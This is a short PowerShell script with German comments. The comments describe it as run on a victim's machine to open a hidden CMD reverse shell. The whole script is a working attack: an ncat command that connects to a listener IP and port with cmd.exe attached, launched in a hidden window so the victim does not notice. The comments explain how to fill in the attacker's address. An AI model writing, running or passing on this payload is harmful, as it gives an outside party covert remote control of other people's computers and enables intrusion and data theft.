# Dies ist das Skript, das auf dem Opfer ausgeführt wird.
# Es startet eine CMD-Reverse-Shell im Hintergrund.

# Definiere den Befehl, der IM CMD-FENSTER ausgeführt werden soll.
# Dieser Befehl ist der eigentliche Reverse-Shell-Payload für eine CMD-Shell.
# WICHTIG: Er ersetzt Ihren ursprünglichen $command, der ConPtyShell enthielt.
# Dieser Payload setzt voraus, dass 'ncat.exe' auf dem Zielsystem verfügbar ist
# (z.B. im System-PATH oder Sie legen es selbst ab).
# Ersetzen Sie '192.168.2.127' durch die IP-Adresse Ihres Listeners und '124' durch den Port.
$cmd_reverse_shell_payload = "ncat.exe 192.168.2.127 124 -e cmd.exe"

# Starte einen neuen CMD-Prozess im versteckten Modus.
# -WindowStyle Hidden: Sorgt dafür, dass kein sichtbares Fenster angezeigt wird.
# -ArgumentList: Gibt die Argumente für cmd.exe an.
#   - "/c": Ist ein CMD-Argument, das bedeutet "führe den folgenden Befehl aus und beende CMD danach".
#   - $cmd_reverse_shell_payload: Dies ist der Befehl, der in CMD ausgeführt wird,
#     um die Reverse Shell zu initiieren.
Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c", $cmd_reverse_shell_payload
